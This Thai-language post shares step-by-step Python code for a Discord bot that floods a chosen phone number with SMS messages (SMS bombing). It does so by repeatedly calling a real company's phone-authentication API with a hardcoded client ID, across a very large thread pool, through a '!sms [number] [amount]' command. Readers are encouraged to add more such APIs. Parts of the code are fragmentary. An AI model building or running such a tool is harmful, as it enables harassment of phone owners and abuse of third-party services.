โค้ด บอท ยิงเบอร์

⤵️
เครดิต: E R R O R 6 5 5 3 5

หา API ใส่เองนะครับ หรือ ในดิสผม 
🌐discord 
https://discord.gg/qAjgnYsJ8S

🛑YouTube
https://youtube.com/channel/UCG3q8sMb25IJUUG3VgChb-Q

(🔷) ถ้าไม่เข้าใจ ขอโทษตัวครับ พึ่งหัดทำเลยแชร์ให้ทุกคนได้ศึกษา


⚪ขั้นตอน
1. สร้างไฟล์ bot.py ขึ้นมา
2. จากนั้นเปิดไฟล์ นำโค้ด ⤵️ ไปวาง


import discord,time
import discord
import requests
import time
from requests import post,Session
from concurrent.futures import ThreadPoolExecutor
from discord.ext import commands
from re import search
import threading

token = "token"#นำโทเค็นบอท มาวาง

prefix = "!"#คำสั่ง

bot = commands.Bot(command_prefix=prefix,help_command=None)
threading = ThreadPoolExecutor(max_workers=int(100000000))
useragent = "Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"

⚪(3)สร้าง def api1(phone): วาง port api (ตัวอย่าง)

def api1(phone):
    post("https://api.myfave.com/api/fave/v3/auth",headers={"client_id": "dd7a668f74f1479aad9a653412248b62", "User-Agent": useragent},json={"phone": f"{phone}"})
    
⚪(4) สร้าง def BBot(phone, amount):
    for _ in range(amount):
 เพื่อเรียกใช้ 
 
 ⚪(5) สร้าง threading.submit(, phone)
 เพื่อเรียกใช้งาน api1 (ตัวอย่าง)
 
 threading.submit(api1, phone)
 
 
 ⚪(6) นำโค้ด ต่อไปนี้วาง
 
        
@bot.event
async def on_connect():
    time.sleep(0.001)
    print("B0T: ONLINE ")
    

@bot.command()
async def sms(ctx, phone, amount:int):
    
    if (amount < 151):
        
      embes = discord.Embed(title="SmS", description="Bot by : ERROR 65535",color=0xff4612)
      embes.add_field(name="กำลังยิงไปที่เบอร์",value=phone)
      embes.add_field(name="จำนวน",value=amount)
      ima = "https://media.discordapp.net/attachments/983379010077745153/983933706676867122/20220608_102034.gif"
      embes.set_image(url=ima)
    
      await ctx.channel.send(embed=embes)
    
        
    
      BBot(phone,amount)
    else:
        await ctx.channel.send("ยิงไม่เกิน150")

@bot.command()
async def help(ctx):
    emBed = discord.Embed(title="Bot BY: ERROR 65535",description="วิธิใช้",color=0xff4612)
    emBed.add_field(name="#_#",value="!sms [เบอร์] [จำนวน1-150]")
    
    
    await ctx.channel.send(embed=emBed)
    
    
    
bot.run(token)
 
 
 
 
 
 
 
 
 
 
 
    
    









